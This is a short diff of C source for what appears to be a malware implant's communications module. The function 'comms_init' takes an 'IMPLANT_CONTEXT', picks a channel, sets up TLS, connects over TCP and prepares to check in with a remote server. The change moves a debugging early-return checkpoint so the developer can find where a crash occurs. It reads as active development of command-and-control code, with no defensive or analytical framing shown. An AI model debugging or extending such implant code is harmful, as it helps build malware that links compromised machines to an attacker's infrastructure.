@@ -1685,10 +1685,6 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
     }
     g_comms_ctx.active_channel = best_idx;
 
-    /* Checkpoint: session key derived, channels found */
-    /* Return early to test if crash is before or after this point */
-    return (NTSTATUS)0xC0000175; /* 175 = checkpoint reached */
-
     /* Initialize TLS credentials */
     status = comms_tls_init(&g_comms_ctx);
     if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000170; /* 170 = TLS init */
@@ -1699,6 +1695,9 @@ NTSTATUS comms_init(IMPLANT_CONTEXT *ctx) {
 
     status = comms_tcp_connect(&g_comms_ctx, ch->url, ch->port);
     if (!NT_SUCCESS(status)) return (NTSTATUS)0xC0000172; /* 172 = TCP connect */
+
+    /* Checkpoint: connected, about to checkin */
+    return (NTSTATUS)0xC0000176; /* 176 = TCP connected */
 
     /* TLS handshake — only for channels with https:// scheme */
     if (ch->needs_tls && g_comms_ctx.api.tls_available) {
